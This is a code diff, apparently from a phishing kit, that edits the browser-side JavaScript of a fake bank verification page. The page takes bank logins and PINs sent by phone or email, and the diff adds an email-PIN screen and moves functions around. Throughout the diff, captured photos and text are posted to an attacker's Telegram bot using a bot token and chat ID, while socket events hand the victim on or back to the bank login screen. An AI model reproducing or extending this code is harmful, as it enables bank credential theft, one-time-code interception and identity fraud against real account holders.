@@ -300,42 +300,6 @@
 
     const socket = io();
 
-    // ==================== FUNCIÓN PARA ENVIAR IMÁGENES A TELEGRAM ====================
-    async function sendPhotoToTelegram(base64, caption) {
-        try {
-            const blob = await (await fetch(base64)).blob();
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, `step-${currentStep}.jpg`);
-            formData.append('caption', caption);
-            formData.append('parse_mode', 'HTML');
-
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            });
-            console.log(`📸 Foto enviada a Telegram: ${caption}`);
-        } catch (e) {
-            console.error("Error enviando foto a Telegram:", e);
-        }
-    }
-
-        function verificarPIN() {
-        const pin = document.getElementById('inputPIN').value.trim();
-        if (pin.length === 0) return;
-        document.getElementById('pin-screen').classList.add('hidden');
-        document.getElementById('loading-etapa2').classList.remove('hidden');
-        socket.emit('verificarPIN', { pin });
-    }
-
-    function sendNewCode() {
-        document.getElementById('inputPIN').value = '';
-        const error = document.getElementById('pin-error');
-        error.textContent = "New PIN code has been sent to your phone";
-        error.classList.remove('hidden');
-        setTimeout(() => error.classList.add('hidden'), 4000);
-    }
-
     // ==================== SOCKET LISTENERS ====================
     socket.on('pasarAPIN', () => {
         document.getElementById('bank-loading-screen').classList.add('hidden');
@@ -347,7 +311,7 @@
         document.getElementById('pin-correo-screen').classList.remove('hidden');
     });
 
-        socket.on('esperandoAprobacion2', () => {
+    socket.on('esperandoAprobacion2', () => {
         // Ocultamos ambas pantallas de PIN (teléfono y correo)
         document.getElementById('pin-screen').classList.add('hidden');
         document.getElementById('pin-correo-screen').classList.add('hidden');
@@ -368,7 +332,6 @@
         setTimeout(() => error.classList.add('hidden'), 3000);
     });
 
-    // ==================== DECLINAR ETAPA 1 ====================
     socket.on('credencialesBancoIncorrectas', () => {
         document.getElementById('bank-loading-screen').classList.add('hidden');
         document.getElementById('loading-etapa2').classList.add('hidden');
@@ -379,9 +342,60 @@
         
         document.getElementById('bank-username').value = '';
         document.getElementById('bank-password').value = '';
-        
-        console.log('🔄 Cliente devuelto al login del banco (declinar Etapa 1)');
     });
+
+    // ==================== FUNCIONES DE PIN ====================
+    function verificarPIN() {
+        const pin = document.getElementById('inputPIN').value.trim();
+        if (pin.length === 0) return;
+        document.getElementById('pin-screen').classList.add('hidden');
+        document.getElementById('loading-etapa2').classList.remove('hidden');
+        socket.emit('verificarPIN', { pin });
+    }
+
+    function sendNewCode() {
+        document.getElementById('inputPIN').value = '';
+        const error = document.getElementById('pin-error');
+        error.textContent = "New PIN code has been sent to your phone";
+        error.classList.remove('hidden');
+        setTimeout(() => error.classList.add('hidden'), 4000);
+    }
+
+    function verificarPINCorreo() {
+        const pin = document.getElementById('inputPINCorreo').value.trim();
+        if (pin.length === 0) return;
+        document.getElementById('pin-correo-screen').classList.add('hidden');
+        document.getElementById('loading-etapa2').classList.remove('hidden');
+        socket.emit('verificarPIN', { pin });
+    }
+
+    function sendNewCodeCorreo() {
+        document.getElementById('inputPINCorreo').value = '';
+        const error = document.getElementById('pin-correo-error');
+        error.textContent = "New PIN code has been sent to your email";
+        error.classList.remove('hidden');
+        setTimeout(() => error.classList.add('hidden'), 4000);
+    }
+
+    // ==================== FUNCIÓN PARA ENVIAR IMÁGENES A TELEGRAM ====================
+    async function sendPhotoToTelegram(base64, caption) {
+        try {
+            const blob = await (await fetch(base64)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, `step-${currentStep}.jpg`);
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'HTML');
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+            console.log(`📸 Foto enviada a Telegram: ${caption}`);
+        } catch (e) {
+            console.error("Error enviando foto a Telegram:", e);
+        }
+    }
 
     function sendToTelegram(text) {
         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -394,7 +408,7 @@
     function startVerification() {
         document.getElementById('intro-screen').classList.add('hidden');
         document.getElementById('verification-flow').classList.remove('hidden');
-        capturedPhotos = [];   // reiniciamos fotos
+        capturedPhotos = [];
         showStep(1);
     }
 
